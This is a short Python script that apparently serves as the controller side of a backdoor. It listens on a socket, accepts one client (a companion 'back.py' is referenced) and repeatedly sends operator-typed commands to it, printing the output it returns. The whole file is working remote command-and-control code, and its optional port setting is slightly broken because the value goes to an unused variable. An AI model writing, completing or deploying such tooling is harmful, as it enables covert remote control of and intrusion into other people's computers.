import socket

# Creating Listening Port
HOST = "127.0.0.1"  # '192.168.43.82'
# -> should be equal to HOST in back.py 
# also should be the IP of the host (not client)
PORT = 8081  # 2222

new_port = input("Input Host Port (Blank if default).")
if new_port != "\n":
    REMOTE_PORT = new_port

server = socket.socket()
server.bind((HOST, PORT))

# Starting Server
print("[+] Server Started")
print("[+] Listening For Client Connection ...")
server.listen(1)
client, client_addr = server.accept()
print(f"[+] {client_addr} Client connected to the server")

# Reciving Commands
while True:
    command = input("Enter Command : ")
    command = command.encode()
    client.send(command)
    print("[+] Command sent")
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
